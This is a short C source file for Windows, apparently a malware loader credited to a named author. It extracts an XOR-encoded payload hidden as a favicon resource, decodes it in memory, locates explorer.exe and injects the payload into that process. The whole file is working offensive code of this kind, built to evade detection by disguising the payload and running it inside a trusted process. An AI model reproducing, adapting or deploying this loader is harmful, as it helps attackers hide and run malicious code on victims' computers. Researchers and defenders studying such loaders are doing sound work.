/*

 Mhmd Mhidat
 Linkedin: https://www.linkedin.com/in/mhmd-mhidat/

*/
#include "header.h"
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
    
	void * exec_mem;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (unsigned char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	XOR((char *) exec_mem, payload_len, key, sizeof(key));

	//INJECTION PROCESS...
	int pid = 0;
    	HANDLE hProc = NULL;
	//Find your target process
	pid = FindTarget("explorer.exe");

	if (pid) {
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc,(unsigned char *) exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
